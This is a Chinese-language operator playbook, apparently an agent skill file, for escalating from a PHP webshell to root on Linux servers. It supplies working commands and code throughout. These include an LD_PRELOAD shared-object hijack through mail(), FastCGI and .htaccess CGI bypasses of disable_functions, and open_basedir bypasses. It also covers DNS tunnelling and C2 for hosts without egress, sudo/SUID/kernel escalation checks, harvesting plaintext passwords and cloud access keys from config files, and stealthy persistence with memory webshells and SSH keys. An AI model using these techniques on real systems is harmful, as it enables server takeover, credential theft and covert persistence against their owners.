---
name: webshell-to-system
description: 拿到 webshell 只是拿到 web 用户的执行权限。这一步到系统权限之间还有 disable_functions、open_basedir、SELinux、不出网四道坎。
---

# 从 webshell 到系统权限

拿到 webshell 的感觉像拿到了服务器，实际只是拿到了 `www-data` 的 PHP 执行权限。

中间隔着四道坎，每一道都可能让你卡住几小时。

---

## 一、先摸清处境（5 分钟）

上传一个信息收集脚本，或者直接执行：

```bash
# 当前身份与权限
id; whoami; hostname; uname -a; cat /etc/os-release

# 能不能执行系统命令
which bash sh python3 perl curl wget nc socat 2>/dev/null

# PHP 限制
php -i 2>/dev/null | grep -E "disable_functions|open_basedir|allow_url_fopen"

# 出网能力
curl -s -m 5 https://ifconfig.me 2>/dev/null || echo "出网失败"
ping -c 1 -W 2 8.8.8.8 2>/dev/null | tail -2

# 写权限
ls -ld /tmp /var/tmp /dev/shm
touch /tmp/.t 2>/dev/null && echo "tmp 可写"
```

**四个关键结论**：

| 结论 | 影响 |
| :--- | :--- |
| 能否执行系统命令 | 不能 → 先绕 disable_functions |
| 能否出网 | 不能 → 只能盲打或用 DNS |
| 能否写文件 | 不能 → 只能内存操作 |
| 有没有 SUID / sudo | 有 → 直接提权 |

---

## 二、第一道坎：disable_functions

### 判断

```php
<?php echo ini_get('disable_functions'); ?>
```

常见禁用列表：`exec,system,passthru,shell_exec,popen,proc_open,pcntl_exec,putenv,assert`

### 绕过方法（按成功率排序）

**1. 找没被禁的函数**

```php
// 这些经常被漏
<?php
$f = ['mail','imap_open','curl_exec','file_put_contents','error_log',
      'mb_send_mail','dl','putenv','apache_setenv','gc_collect_cycles'];
foreach ($f as $x) echo $x . ': ' . (function_exists($x) ? 'OK' : 'NO') . "\n";
```

**2. LD_PRELOAD + mail()**

`mail()` 会调用 `sendmail`，通过 `putenv` 设置 `LD_PRELOAD` 可以劫持。

```c
// evil.c
#include <stdlib.h>
__attribute__((constructor)) void init() {
    system("id > /tmp/pwned");
}
```

```bash
gcc -shared -fPIC evil.c -o evil.so
```

```php
<?php
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.c", "", "", "");
```

**前提**：`putenv` 和 `mail` 没被禁，且能编译（或上传预编译的 .so）。

**3. PHP-FPM 绕过（最有效，如果拿到 FPM socket）**

如果能写 `.php` 到任意目录，且 FPM 配置有 `security.limit_extensions` 漏洞，可以构造 FastCGI 请求执行任意代码。

```bash
# 用 gopherus 或手写
python3 gopherus.py --exploit fastcgi
```

**4. Apache + mod_cgi**

写 `.htaccess` 让某个扩展名当 CGI 执行：

```
Options +ExecCGI
AddHandler cgi-script .abc
```

然后传一个 `.abc` 文件，内容是 `#!/bin/sh\necho Content-Type: text/plain\n\nid`。

**5. 内核漏洞（最后手段）**

`CVE-2022-0847`（Dirty Pipe）、`CVE-2021-4034`（PwnKit）这类不需要执行命令，只需要写文件 + 触发。

**风险**：可能打崩机器。

### 判断该用哪个

```
[ ] putenv + mail 可用？        → 试 LD_PRELOAD
[ ] 能写任意 .php 文件？        → 试 FPM / .htaccess
[ ] 有 SUID 二进制？            → 试 SUID 提权（不需要绕 disable_functions）
[ ] 内核版本老？                → 试内核漏洞
```

**注意**：很多情况下你**不需要**绕过 disable_functions —— 直接找一个 SUID 文件或可写 cron 就够了。先看提权面，再决定要不要绕。

---

## 三、第二道坎：open_basedir

### 判断

```php
<?php echo ini_get('open_basedir'); ?>
```

限制了 PHP 能访问的目录。表现：`file_get_contents('/etc/passwd')` 报 "open_basedir restriction in effect"。

### 绕过

**1. glob 协议**

```
?file=glob:///etc/passwd
```

**2. 目录遍历 + 软链接**（需要写权限）

```php
<?php symlink('/etc/passwd', '/var/www/html/x.txt'); ?>
```

**3. FastCGI 直接读**（如果拿到 FPM socket）

**4. 换语言**

open_basedir 只管 PHP。如果服务器有 CGI/Perl/Python 入口，走别的语言就绕过了。

---

## 四、第三道坎：不出网

服务器不能连外网时：

### 判断

```bash
curl -s -m 5 https://1.1.1.1 2>&1
# 超时 = 不出网；立即拒绝 = 出网但被防火墙拦
```

### 应对

| 情况 | 做法 |
| :--- | :--- |
| 完全不出网 | 所有操作走 webshell（上传工具 → 执行 → 读结果） |
| 只允许 DNS | DNS 隧道（dnscat2 / iodine） |
| 只允许特定端口 | 把 C2 架在 80/443 |
| 有内网其他机器 | 找一台能出网的做跳板 |

**不出网时的操作模式**：

```
1. 本地准备好工具（静态编译，无依赖）
2. base64 编码后通过 webshell 上传（分块，避免超长请求）
3. 执行，结果写文件
4. 读文件
```

**工具选择**：优先静态编译的（`chisel`、`frp`、`nps` 都有静态版本）。glibc 版本不匹配是最常见的坑。

```bash
# 检查目标 glibc
ldd --version | head -1
```

---

## 五、第四道坎：提权

### Linux 快速检查（10 分钟）

```bash
# 1. sudo 配置
sudo -l

# 2. SUID
find / -perm -4000 -type f 2>/dev/null

# 3. 可写服务/配置
find /etc -writable -type f 2>/dev/null
ls -la /etc/cron* /var/spool/cron 2>/dev/null

# 4. 内核版本
uname -r

# 5. 环境变量
env | grep -iE "path|ld_"

# 6. 家目录里的敏感文件
ls -la ~/.ssh ~/.bash_history ~/.aws ~/.docker 2>/dev/null

# 7. 数据库配置（常含明文密码）
find / -name "wp-config.php" -o -name "config.php" -o -name ".env" 2>/dev/null | head -20
```

**最高效的顺序**：

1. `sudo -l`（配错就是直接的 root）
2. 可写的 cron / systemd 服务
3. SUID 里认识的那几个（`find` / `vim` / `nmap` / `less` / `awk`）
4. 内核漏洞（最后）

### 最容易忽略的一条

**配置文件里的明文密码**。`wp-config.php`、`.env`、`docker-compose.yml`、`application.properties` 里经常有数据库 root 密码、云厂商 AK/SK。

拿到云 AK 就等于拿到整个云环境，比提权到单机 root 价值大得多。

---

## 六、持久化：什么时候做，什么时候不做

**做持久化的前提**：确认这台机器有长期价值（在内网核心位置 / 有数据库 / 能横向）。

**不做的情况**：一次性拿数据就走、目标有 EDR 监控、授权范围只到验证。

### 低痕迹方式

| 方式 | 痕迹 |
| :--- | :--- |
| SSH 公钥写入 `~/.ssh/authorized_keys` | 低（但 `~/.ssh` 变更容易被监控） |
| 计划任务（cron） | 中（crontab 有日志） |
| systemd service | 中 |
| 内存马（Java/PHP） | 低（重启即失效） |
| webshell 留在不明显路径 | 中（文件扫描能发现） |

**最稳的是内存马** —— 不落文件，重启失效但重启本身也是痕迹。

---

## 七、检查清单

```
[ ] 当前用户：              ______
[ ] 能执行命令：            是 / 否（绕法___）
[ ] disable_functions：     有(列表___) / 无
[ ] open_basedir：          有(___) / 无
[ ] 能出网：                是 / 否 / 只能 DNS
[ ] 能写 /tmp：             是 / 否
[ ] sudo -l 结果：          ______
[ ] SUID 可疑项：           ______
[ ] 配置文件明文密码：      找到(___) / 没找
[ ] 云 AK/SK：              找到(___) / 没找
[ ] 提权路径：              ______
[ ] 是否需要持久化：        是 / 否
```

**优先级提醒**：配置文件里的凭据 > 云 AK/SK > sudo 配错 > SUID > 内核漏洞。前两个拿到的权限往往比 root 更大。
